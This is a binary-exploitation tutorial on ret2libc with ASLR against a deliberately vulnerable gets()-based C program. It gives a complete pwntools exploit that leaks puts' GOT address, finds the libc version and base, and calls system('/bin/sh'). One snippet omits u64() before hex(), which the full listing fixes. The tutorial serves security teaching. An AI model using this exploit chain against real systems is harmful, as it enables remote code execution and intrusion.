# Ret2libc with ASLR

The code is the same as shellcode, but the executable is different.

```c
#include <stdio.h>
int main(){
    char name[100];
    fputs("Enter name: ", stdout);
    gets(name);
    fputs("Hello: ", stdout);
    puts(name);
    return 0;
}
```

Compile: `gcc chal.c -o chal -no-pie`

ASLR enabled.

```
➜  cat /proc/sys/kernel/randomize_va_space
2
```

If we run the attack from ret2libc, it now fails with a segfault. Why? Let's look at `ldd`

```
➜ ldd chal
linux-vdso.so.1 (0x00007fffaeb22000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f11f8079000)
/lib64/ld-linux-x86-64.so.2 (0x00007f11f8255000)
```

```
➜ ldd chal
linux-vdso.so.1 (0x00007ffdb4d03000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f12a259d000)
/lib64/ld-linux-x86-64.so.2 (0x00007f12a2779000)
```

The address of libc is different every time! This is due to ASLR, which randomizes the position of libc every time an executable is run. Fortunately, we can use the GOT and PLT to overcome this mitigation.

## Global Offset Table (GOT) and Procedure Linkage Table (PLT)

If the starting address of libc is randomized every time, how does the compiler know the address of libc functions to call? In fact, it doesn't. Instead, the compiler generates code that jumps to an entry in the PLT, which contains instructions to resolve the actual address of the function using a linker. Once the actual address is resolved, it is cached in the GOT. As PLT and GOT's locations are know ahead of time, we can use a ROP chain to read data from GOT, thus leaking the function address.

### Part 1: Leaking `puts` address

We choose the puts function as

1. It is used in the code (most important) (check `e.plt` and `e.got`)
2. It prints stuff (also very important)
3. It only requires 1 argument

Generally, puts is quite commonly used.

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
context.binary = e

padding = b"a"*120
puts_plt = e.plt.puts
puts_got = e.got.puts
rop = ROP(e)
# Print address of puts in got 
rop.call(puts_plt, (puts_got, ))
# We must execute all payloads in the same process otherwise libc address will be different
# Call main to execute second payload
rop.call(e.symbols.main)
p.sendline(padding+rop.chain())
# Discard `puts(name)`
p.recvline()
# Address is 8 bytes but last 2 bytes are null bytes, thus discarded by puts
puts_addr = p.recvline()[-7:-1] + b"\0\0"
# Ensure we got the offset right
assert (not puts_addr.startswith(b"a"))
print(hex(puts_addr))
```

```
> 0x7f33862125f0
```

### Part 2: Getting libc version

Before we move on with the attack, we must identify the libc version in use, because the positions of functions in libc varies between versions. We can use [the libc database](https://libc.blukat.me/) for this. This works because libc is always loaded at `0xXXXXXXXXXXXXX000`, even with ASLR, so that things align nicely in memory. Thus, the last 3 nibbles will be the same, even with ASLR. I wrote a [small library](./libc_search.py) to automate this process:

```python
fetch_libc_ver(puts_addr)
```

```
> ['libc6-amd64_2.31-9_i386', 'libc6_2.31-9_amd64']
```

Since we're on `x64`, the second one will probably work.

 ```python
 libc_version = 'libc6_2.31-9_amd64'
 libc = ELF(download_libc(libc_version),checksec=False)
 ```

### Part 3: Getting libc location

Once we've identified which version of libc we're using, we can find the location of puts in libc and compare it with the leaked puts position to find where libc is mounted.

```python
libc_puts_addr = libc.symbols._IO_puts
libc_addr = puts_addr - libc_puts_addr
libc.address = libc_addr
print("Libc address",hex(libc.address))
# Check that libc address is aligned
assert hex(libc.address).endswith("000"), "LIBC address not aligned"
```

### Part 4: Exploitation

After getting the libc address, the process is similar to ret2libc.

```python
rop2 = ROP(e)
sys = libc.symbols.system
sh = next(libc.search(b"/bin/sh"))
rop2.call(sys, (sh,))
p.sendline(padding+rop2.chain())
p.interactive()
```

## Full exploit code

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
context.binary = e

padding = b"a"*120
puts_plt = e.plt.puts
puts_got = e.got.puts
rop = ROP(e)
# Print address of puts in got 
rop.call(puts_plt, (puts_got, ))
# We must execute all payloads in the same process otherwise libc address will be different
# Call main to execute second payload
rop.call(e.symbols.main)
p.sendline(padding+rop.chain())
# Discard `puts(name)`
p.recvline()
# Address is 8 bytes but last 2 bytes are null bytes, thus discarded by puts
puts_addr = p.recvline()[-7:-1] + b"\0\0"
# Ensure we got the offset right
assert (not puts_addr.startswith(b"a"))
puts_addr = u64(puts_addr)
print(hex(puts_addr))

libc_version = 'libc6_2.31-9_amd64'
libc = ELF(download_libc(libc_version),checksec=False)

libc_puts_addr = libc.symbols._IO_puts
libc_addr = puts_addr - libc_puts_addr
libc.address = libc_addr
print("Libc address",hex(libc.address))
# Check that libc address is aligned
assert hex(libc.address).endswith("000"), "LIBC address not aligned"

rop2 = ROP(e)
sys = libc.symbols.system
sh = next(libc.search(b"/bin/sh"))
rop2.call(sys, (sh,))
p.sendline(padding+rop2.chain())
p.interactive()
```

